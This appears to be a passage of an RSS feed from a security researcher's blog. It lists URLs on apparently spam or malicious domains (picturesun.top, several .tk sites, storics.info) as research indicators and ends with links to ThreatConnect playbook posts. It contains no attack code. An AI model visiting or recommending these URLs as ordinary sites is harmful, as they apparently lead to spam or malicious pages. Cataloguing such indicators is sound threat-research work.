http://picturesun.top/blog/?p=158
http://picturesun.top/blog/?p=1589
http://picturesun.top/blog/?p=1600
http://picturesun.top/blog/?p=1611
http://picturesun.top/blog/?p=1631
http://picturesun.top/blog/?p=1651
http://picturesun.top/blog/?p=1655
http://picturesun.top/blog/?p=1658
http://picturesun.top/blog/?p=1667
http://picturesun.top/blog/?p=1675
http://picturesun.top/blog/?p=1690
http://picturesun.top/blog/?p=1694
http://picturesun.top/blog/?p=174
http://picturesun.top/blog/?p=178
http://picturesun.top/blog/?p=18
http://picturesun.top/blog/?p=183
http://picturesun.top/blog/?p=209
http://picturesun.top/blog/?p=213
http://picturesun.top/blog/?p=226
http://picturesun.top/blog/?p=242
http://picturesun.top/blog/?p=252
http://picturesun.top/blog/?p=256
http://picturesun.top/blog/?p=268
http://picturesun.top/blog/?p=274
http://picturesun.top/blog/?p=280
http://picturesun.top/blog/?p=306
http://picturesun.top/blog/?p=312
http://picturesun.top/blog/?p=314
http://picturesun.top/blog/?p=334
http://picturesun.top/blog/?p=348
http://picturesun.top/blog/?p=354
http://picturesun.top/blog/?p=374
http://picturesun.top/blog/?p=376
http://picturesun.top/blog/?p=380
http://picturesun.top/blog/?p=382
http://picturesun.top/blog/?p=396
http://picturesun.top/blog/?p=404
http://picturesun.top/blog/?p=418
http://picturesun.top/blog/?p=426
http://picturesun.top/blog/?p=430
http://picturesun.top/blog/?p=448
http://picturesun.top/blog/?p=452
http://picturesun.top/blog/?p=458
http://picturesun.top/blog/?p=470
http://picturesun.top/blog/?p=476
http://picturesun.top/blog/?p=480
http://picturesun.top/blog/?p=484
http://picturesun.top/blog/?p=500
http://picturesun.top/blog/?p=513
http://picturesun.top/blog/?p=517
http://picturesun.top/blog/?p=523
http://picturesun.top/blog/?p=527
http://picturesun.top/blog/?p=529
http://picturesun.top/blog/?p=531
http://picturesun.top/blog/?p=537
http://picturesun.top/blog/?p=541
http://picturesun.top/blog/?p=543
http://picturesun.top/blog/?p=545
http://picturesun.top/blog/?p=551
http://picturesun.top/blog/?p=557
http://picturesun.top/blog/?p=565
http://picturesun.top/blog/?p=567
http://picturesun.top/blog/?p=569
http://picturesun.top/blog/?p=573
http://picturesun.top/blog/?p=575
http://picturesun.top/blog/?p=622
http://picturesun.top/blog/?p=86
http://picturesun.top/blog/?p=92
http://picturesun.top/blog/?p=96
http://picturesun.top/blog/latest.php
http://rriverrponse.tk/index/?8mMwj2&amp;amp;extra_param_1=695
http://sarriverdoma.tk/index/?8mMwj2&amp;amp;extra_param_1=695
http://school-fix-news.info/2019/01/09/car-accident-my-fault-will-my-insurance-go-up/
http://storics.info/2018/12/27/business-credit-cards-for-bad-credit/
http://storics.info/2018/12/27/cheapest-home-equity-line-of-credit/
http://storics.info/2018/12/27/paid-in-full-on-credit-report/
http://storics.info/2018/12/27/wipe-credit-clean/
http://storics.info/latest.php
http://visnu.icu/philadelphia-indemnity-car-insurance/
https://www.twero.com/en/profiles?p=1027797&amp;amp;pi=test1&amp;amp;_=1548965393
&lt;/code>&lt;/pre>&lt;p>I intend to more investigation on the registrant information for these domains at some point and will keep you posted!&lt;/p></description></item><item><title>Playbook Friday Blogs</title><link>https://hightower.space/posts/tc-pb-friday-blog-posts/</link><pubDate>Wed, 24 Oct 2018 00:00:00 +0000</pubDate><guid>https://hightower.space/posts/tc-pb-friday-blog-posts/</guid><description>&lt;p>The following playbooks have been featured in a ThreatConnect &amp;ldquo;Playbook Friday&amp;rdquo; blog post:&lt;/p>
&lt;ul>
&lt;li>&lt;a href="https://threatconnect.com/blog/google-alerts-rss-reader/">https://threatconnect.com/blog/google-alerts-rss-reader/&lt;/a>&lt;/li>
&lt;li>&lt;a href="https://threatconnect.com/blog/robtex-asn-query-ip-query/">https://threatconnect.com/blog/robtex-asn-query-ip-query/&lt;/a>&lt;/li>
&lt;li>&lt;a href="https://threatconnect.com/blog/task-management/">https://threatconnect.com/blog/task-management/&lt;/a>&lt;/li>
&lt;/ul></description></item></channel></rss>